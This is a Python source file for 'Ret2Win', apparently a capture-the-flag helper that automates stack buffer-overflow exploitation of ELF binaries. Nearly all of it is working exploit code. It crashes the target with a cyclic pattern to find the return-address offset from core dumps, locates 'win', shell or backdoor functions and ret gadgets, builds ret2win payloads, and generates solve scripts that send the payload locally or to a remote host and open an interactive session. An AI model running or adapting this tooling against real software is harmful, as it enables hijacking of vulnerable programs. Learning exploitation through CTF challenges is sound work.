#!/usr/bin/env python3
"""
core.py - Ret2Win Core Engine
Provides binary analysis, offset detection via core dumps,
payload generation, hexdump rendering, and execution routines.
"""

import os
import sys
import resource
import glob
from typing import Optional, Dict, Any, List, Tuple

try:
    from pwn import (
        context, process, remote, ELF, cyclic, cyclic_find, p32, p64, log, ROP
    )
except ImportError:
    print("[!] This tool requires pwntools. Install it with: pip install pwntools")
    sys.exit(1)

from rich.table import Table
from rich.text import Text

# Suppress pwntools default console noise when driven by TUI/scripts
context.log_level = 'error'

__all__ = [
    "analyze_binary",
    "find_offset",
    "parse_address",
    "build_payload",
    "format_payload_breakdown",
    "format_colorized_hexdump",
    "generate_solve_script",
    "get_elf_functions",
    "validate_offset",
    "clean_core_dumps",
]


def clean_core_dumps():
    """Remove leftover core dump files (e.g. core, core.12345) from working directory."""
    for pattern in ["core", "core.[0-9]*"]:
        for f in glob.glob(pattern):
            try:
                os.remove(f)
            except OSError:
                pass


def analyze_binary(path: str) -> Dict[str, Any]:
    """
    Inspect an ELF binary for architecture, checksec mitigations,
    candidate win symbols, and lone ret gadgets for stack alignment.
    """
    if not os.path.isfile(path):
        raise FileNotFoundError(f"Binary file not found: {path}")

    elf = ELF(path, checksec=False)
    bits = 64 if elf.bits == 64 else 32

    # Identify candidate win / flag / shell functions in symbols
    keywords = [
        "win", "flag", "target", "secret", "shell", "spawn",
        "cat", "print", "admin", "backdoor", "pwn", "get_flag",
        "give_shell", "system", "print_flag", "callme"
    ]
    candidates: List[Dict[str, str]] = []
    seen = set()

    for name, addr in sorted(elf.symbols.items(), key=lambda x: x[1]):
        # Guard against non-string keys (modern pwntools may have integer keys)
        if not isinstance(name, str):
            continue
        # Filter out noisy GOT and internal wrappers
        if name.startswith("got.") or name.startswith("_"):
            continue
        lower_name = name.lower()
        if any(k in lower_name for k in keywords):
            if name not in seen:
                seen.add(name)
                candidates.append({"name": name, "addr": hex(addr)})

    # Search for a lone ret gadget for x86_64 stack alignment
    ret_gadget = None
    if bits == 64:
        # First try pwntools ROP gadget finder
        try:
            rop = ROP(elf)
            ret_match = rop.find_gadget(["ret"])
            if ret_match:
                ret_gadget = hex(ret_match.address)
        except Exception:
            ret_gadget = None

        # Fallback to direct opcode search if ROP finder didn't locate one
        if not ret_gadget:
            try:
                ret_addr = next(elf.search(b"\xc3", executable=True))
                ret_gadget = hex(ret_addr)
            except (StopIteration, Exception):
                pass

    return {
        "path": path,
        "arch": elf.arch,
        "bits": bits,
        "endian": elf.endian,
        "pie": bool(elf.pie),
        "canary": bool(elf.canary),
        "nx": bool(elf.nx),
        "relro": str(elf.relro),
        "candidates": candidates,
        "ret_gadget": ret_gadget,
        "symbols": {k: hex(v) for k, v in elf.symbols.items() if isinstance(k, str) and not k.startswith("got.")}
    }


def find_offset(binary_path: str, max_len: int = 2048, input_mode: str = "stdin", logger=None) -> int:
    """
    Crash the binary with a cyclic De Bruijn pattern and inspect the core dump
    to determine the offset to the saved return address (EIP/RIP).
    Handles both canonical and non-canonical fault addresses on 32-bit and 64-bit architectures.
    """
    def _log(msg: str, style: str = ""):
        if logger:
            logger(msg, style)
        else:
            log.info(msg)

    # Enable core dumps for this process tree
    try:
        resource.setrlimit(
            resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY)
        )
    except Exception as e:
        _log(f"Warning: Could not raise core dump limit: {e}", "yellow")

    elf = ELF(binary_path, checksec=False)
    context.binary = elf
    pattern = cyclic(max_len)

    _log(f"Launching {binary_path} with {max_len}-byte cyclic pattern...", "cyan")

    # Run process
    if input_mode == "stdin":
        p = process(binary_path)
        try:
            p.sendline(pattern)
            try:
                p.wait(timeout=3.0)
            except Exception:
                p.kill()
        except EOFError:
            pass
    elif input_mode == "argv":
        p = process([binary_path, pattern])
        try:
            p.wait(timeout=3.0)
        except Exception:
            p.kill()
    else:
        raise ValueError(f"Unsupported input mode: {input_mode}")

    core_dump = p.corefile
    if core_dump is None:
        raise RuntimeError(
            "No core dump was produced. Verify core dumps are enabled "
            "('ulimit -c unlimited') and that the binary actually crashes on this input. "
            "Pass --offset manually if the crash mechanism is non-standard."
        )

    offset = -1
    detected_reg = "unknown"

    # Strategy 1: Check faulting address (on x86_64 non-canonical ret crashes, fault_addr holds the popped value)
    fault_addr = getattr(core_dump, "fault_addr", 0)
    if fault_addr and fault_addr != 0:
        try:
            idx = cyclic_find(fault_addr & 0xFFFFFFFF)
            if idx >= 0:
                offset = idx
                detected_reg = f"fault_addr ({hex(fault_addr)})"
        except Exception:
            pass

    # Strategy 2: Check RIP / EIP
    if offset < 0:
        ip = core_dump.rip if elf.bits == 64 else core_dump.eip
        if ip and ip != 0:
            try:
                idx = cyclic_find(ip & 0xFFFFFFFF)
                if idx >= 0:
                    offset = idx
                    detected_reg = f"instruction pointer ({hex(ip)})"
            except Exception:
                pass

    # Strategy 3: Check stack pointer (RSP / ESP)
    if offset < 0:
        sp = core_dump.rsp if elf.bits == 64 else core_dump.esp
        ws = elf.bytes
        for sp_offset in [0, -ws, ws, -2 * ws, 2 * ws]:
            try:
                val = core_dump.read(sp + sp_offset, ws)
                idx = cyclic_find(val[:4])
                if idx >= 0:
                    offset = idx
                    detected_reg = f"stack [SP{sp_offset:+d}] ({val[:4]!r})"
                    break
            except Exception:
                pass

    try:
        clean_core_dumps()
    except Exception:
        pass

    if offset < 0:
        raise RuntimeError(
            f"Could not find cyclic pattern in crash registers (fault={hex(fault_addr)}, rip={hex(core_dump.rip)}). "
            "The crash did not overwrite the instruction pointer or stack with the pattern. "
            "Increase --max-len or set --offset manually."
        )

    _log(f"Crash detected via {detected_reg} -> Computed Offset: {offset}", "green")
    return offset


def parse_address(val: Any, symbols: Optional[Dict[str, Any]] = None) -> int:
    """
    Parses a string or integer address. Supports hex ('0x401196' or '401196'), decimal,
    or looking up a symbol name if available.
    """
    if isinstance(val, int):
        return val
    s = str(val).strip()
    if not s:
        raise ValueError("Address cannot be empty.")

    # 1. Match symbol table if provided
    if symbols and s in symbols:
        sym_val = symbols[s]
        return int(sym_val, 16) if isinstance(sym_val, str) else int(sym_val)

    # 2. Explicit hex prefix '0x'
    if s.lower().startswith("0x"):
        return int(s, 16)

    # 3. Hex without '0x' if contains hex letters [a-fA-F]
    if any(c in "abcdefABCDEF" for c in s):
        try:
            return int(s, 16)
        except ValueError:
            pass

    # 4. If all digits: check typical memory address ranges (> 0x1000 or length >= 5)
    if s.isdigit():
        if len(s) >= 5:
            try:
                return int(s, 16)
            except ValueError:
                pass
        return int(s)

    try:
        return int(s, 16)
    except ValueError:
        raise ValueError(f"Cannot resolve '{s}' into a valid memory address or symbol.")


def build_payload(offset: int, win_addr: int, bits: int = 64, align: bool = False, ret_gadget: Optional[int] = None) -> bytes:
    """
    Constructs the ret2win payload: junk padding + (optional ret gadget) + win address.
    """
    junk = b"A" * max(0, offset)
    packed_win = p64(win_addr) if bits == 64 else p32(win_addr)

    payload = junk
    if bits == 64 and align and ret_gadget is not None:
        payload += p64(ret_gadget)

    payload += packed_win
    return payload


def format_payload_breakdown(offset: int, win_addr: int, bits: int = 64, align: bool = False, ret_gadget: Optional[int] = None) -> Tuple[bytes, Table]:
    """
    Builds the payload and creates a structured Rich Table breaking down its anatomy.
    """
    junk = b"A" * max(0, offset)
    packed_win = p64(win_addr) if bits == 64 else p32(win_addr)
    packed_ret = p64(ret_gadget) if (bits == 64 and align and ret_gadget is not None) else b""

    payload = junk + packed_ret + packed_win

    table = Table(title="🎯 Payload Anatomy Breakdown", show_header=True, header_style="bold cyan")
    table.add_column("Component", style="bold")
    table.add_column("Size", justify="right")
    table.add_column("Value", style="dim")
    table.add_column("Hex Representation")

    junk_preview = junk[:16].hex() + ("..." if offset > 16 else "")
    table.add_row("Buffer Padding (Junk)", f"{offset} B", f"'A' * {offset}", junk_preview)

    if bits == 64 and align:
        if ret_gadget is not None:
            table.add_row("Stack Align Gadget (ret)", "8 B", hex(ret_gadget), packed_ret.hex())
        else:
            table.add_row("[yellow]Stack Align Gadget[/yellow]", "0 B", "[red]Missing Gadget![/red]", "[yellow]Ret gadget not set[/yellow]")

    table.add_row("Target Function Address", f"{len(packed_win)} B", hex(win_addr), packed_win.hex())
    table.add_row("[bold green]Total Payload[/bold green]", f"[bold green]{len(payload)} B[/bold green]", "", f"...{payload[-16:].hex()}")

    return payload, table


def format_colorized_hexdump(payload: bytes, offset: int, has_align: bool = False, bits: int = 64) -> Text:
    """
    Renders a colorized hexdump highlighting:
    - Red: Buffer junk padding
    - Yellow: Alignment ret gadget
    - Green: Target win address
    """
    ret_len = 8 if (has_align and bits == 64) else 0
    win_len = 8 if bits == 64 else 4

    text = Text()
    if not payload:
        return Text("Empty payload.", style="dim")

    for row_start in range(0, len(payload), 16):
        row = payload[row_start:row_start + 16]
        text.append(f"{row_start:04x}:  ", style="bright_black")

        # Hex columns
        for i in range(16):
            idx = row_start + i
            if idx < len(payload):
                b = payload[idx]
                if idx < offset:
                    style = "dim red"
                elif idx < offset + ret_len:
                    style = "bold yellow"
                else:
                    style = "bold green"
                text.append(f"{b:02x} ", style=style)
            else:
                text.append("   ")
            if i == 7:
                text.append(" ")

        text.append(" |", style="bright_black")
        # ASCII columns
        for i in range(16):
            idx = row_start + i
            if idx < len(payload):
                b = payload[idx]
                char = chr(b) if 32 <= b <= 126 else "."
                if idx < offset:
                    style = "dim red"
                elif idx < offset + ret_len:
                    style = "bold yellow"
                else:
                    style = "bold green"
                text.append(char, style=style)
            else:
                text.append(" ")
        text.append("|\n", style="bright_black")

    return text


def generate_solve_script(binary_path: str, offset: int, win_addr: int, bits: int = 64, align: bool = False, ret_gadget: Optional[int] = None, remote_target: Optional[Tuple[str, int]] = None, input_mode: str = "stdin") -> str:
    """
    Generates a standalone, production-ready pwntools Python solve script.
    """
    script_lines = [
        "#!/usr/bin/env python3",
        "# Generated by Ret2Win (by -Casper)",
        "# Target: " + binary_path,
        "from pwn import *",
        "",
        f"binary_path = '{binary_path}'",
        "elf = context.binary = ELF(binary_path, checksec=False)",
        "context.log_level = 'info'",
        "",
        f"offset = {offset}",
        f"win_addr = {hex(win_addr)}",
    ]

    if align and ret_gadget is not None:
        script_lines.append(f"ret_gadget = {hex(ret_gadget)}  # 16-byte stack alignment")
        script_lines.append("payload = flat({offset: [ret_gadget, win_addr]})")
    else:
        script_lines.append("payload = flat({offset: win_addr})")

    script_lines.append("")
    if remote_target:
        host, port = remote_target
        script_lines.extend([
            f"# Connect to remote target: {host}:{port}",
            f"io = remote('{host}', {port})",
            "io.sendline(payload)",
            "io.interactive()"
        ])
    else:
        if input_mode == "argv":
            script_lines.extend([
                "# Launch local process with payload as argv[1]",
                "io = process([binary_path, payload])",
                "io.interactive()"
            ])
        else:
            script_lines.extend([
                "# Launch local process and send payload via stdin",
                "io = process(binary_path)",
                "io.sendline(payload)",
                "io.interactive()"
            ])

    return "\n".join(script_lines) + "\n"


def get_elf_functions(path: str) -> List[Dict]:
    """
    Return ALL named functions found in the ELF symbol table, not just win candidates.
    Each entry is a dict with 'name', 'addr' (hex string), and 'is_candidate'.
    """
    if not os.path.isfile(path):
        raise FileNotFoundError(f"Binary file not found: {path}")

    elf = ELF(path, checksec=False)
    functions: List[Dict] = []
    seen = set()

    keywords = [
        "win", "flag", "target", "secret", "shell", "spawn",
        "cat", "print", "admin", "backdoor", "pwn", "get_flag",
        "give_shell", "system", "print_flag", "callme"
    ]

    for name, addr in sorted(elf.symbols.items(), key=lambda x: x[1]):
        if not isinstance(name, str):
            continue
        if name.startswith("got."):
            continue
        if name not in seen:
            seen.add(name)
            is_cand = any(k in name.lower() for k in keywords)
            functions.append({
                "name": name,
                "addr": hex(addr),
                "is_candidate": is_cand
            })

    return functions


def validate_offset(binary_path: str, offset: int, input_mode: str = "stdin") -> bool:
    """
    Quick sanity check for a proposed buffer-overflow offset.
    Sends b'A' * offset + b'BBBB' (or 8 B's for 64-bit) and checks
    whether the crash registers or stack indicate exact control of the return address.
    """
    if not os.path.isfile(binary_path):
        raise FileNotFoundError(f"Binary file not found: {binary_path}")

    try:
        resource.setrlimit(
            resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY)
        )
    except Exception:
        pass

    elf = ELF(binary_path, checksec=False)
    context.binary = elf
    bits = elf.bits

    marker = b"B" * (8 if bits == 64 else 4)
    payload = b"A" * max(0, offset) + marker

    if input_mode == "stdin":
        p = process(binary_path)
        try:
            p.sendline(payload)
            try:
                p.wait(timeout=3.0)
            except Exception:
                p.kill()
        except EOFError:
            pass
    elif input_mode == "argv":
        p = process([binary_path, payload])
        try:
            p.wait(timeout=3.0)
        except Exception:
            p.kill()
    else:
        return False

    core_dump = p.corefile
    if core_dump is None:
        clean_core_dumps()
        return False

    expected_num = 0x4242424242424242 if bits == 64 else 0x42424242
    matched = False

    # Check 1: fault_addr
    if getattr(core_dump, "fault_addr", 0) == expected_num:
        matched = True

    # Check 2: instruction pointer
    ip = core_dump.rip if bits == 64 else core_dump.eip
    if ip == expected_num or (ip & 0xFFFFFFFF) == (expected_num & 0xFFFFFFFF):
        matched = True

    # Check 3: stack value at SP or SP-8
    sp = core_dump.rsp if bits == 64 else core_dump.esp
    ws = elf.bytes
    for sp_offset in [0, -ws, ws]:
        try:
            val = core_dump.read(sp + sp_offset, len(marker))
            if val == marker:
                matched = True
                break
        except Exception:
            pass

    clean_core_dumps()
    return matched
